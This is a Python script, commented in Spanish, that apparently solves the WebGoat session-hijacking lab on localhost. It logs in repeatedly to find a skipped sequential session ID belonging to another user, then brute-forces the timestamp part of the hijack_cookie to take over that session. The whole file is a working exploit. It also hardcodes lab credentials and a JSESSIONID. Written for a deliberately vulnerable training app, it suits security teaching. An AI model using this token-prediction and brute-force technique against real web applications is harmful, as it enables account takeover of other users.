import requests
import re

username = 'sranaa' # mi user en WG
password = 'h!lI99'
JSESSIONID = '66HJuQ_osknHgZpeFBSD0k2aAELer_UpEibfFEGq' #JID en WG

sessionFoundId = 0 # id_session_encontrada
sessionFoundStartTime = 0
sessionFoundEndTime = 0
currentSessionId = 0
previousSessionId = 0
currentSessionTimestamp = 0 #marca_tiempo_session_actual
previousSessionTimestamp = 0 #marca_tiempo_session_anterior

print("Busqueda de session")

headers={'Cookie': f'JSESSIONID={JSESSIONID};'} # defino el header que le voy a pasar a la request

for request in range(1, 1001):

    # Solicitud para apuntar al endpoint de inicio de session
    response= requests.post(f'http://localhost:8080/WebGoat/HijackSession/login/?username={username}&password={password}', headers=headers)
    cookie_header=response.headers.get('Set-Cookie')

    hijack= re.findall(r'hijack_cookie=(.*?);', cookie_header) # la expresion regular busca lo que empieza con hijack_cookie, seguida de cualquier caracter, hasta el primer caracter en blanco
    currentSessionId, currentSessionTimestamp = hijack[0].split('-') # obtenego el sessionId y el timestampID


    """
        Esto vera que la primera identificacion de la session anterior esta en blanco. Luego verificara
        si la identificacion de la session actual que es mia y la ID de session anterior es igual a 2,
        de ser igual a 2 es porque en el medio omitio una ID de session, que corresponde a otro usuario
    """
    if previousSessionId != 0 and int(currentSessionId) - int(previousSessionId)==2:
        sessionFoundId= int(previousSessionId)+1

        sessionFoundStartTime = previousSessionTimestamp
        sessionFoundEndTime= currentSessionTimestamp
        break

    previousSessionId=currentSessionId
    previousSessionTimestamp=currentSessionTimestamp

print(f'El ID de la session encontrada es: {sessionFoundId}')

for timestamp in range(int(sessionFoundStartTime), int(sessionFoundEndTime)):
    response_v2= requests.post(f'http://localhost:8080/WebGoat/HijackSession/login/?username={username}&password={password}', headers={'Cookie': f'JSESSIONID={JSESSIONID}; hijack_cookie={sessionFoundId}-{timestamp}; secure;'})
    print(f'{sessionFoundId}-{timestamp}')
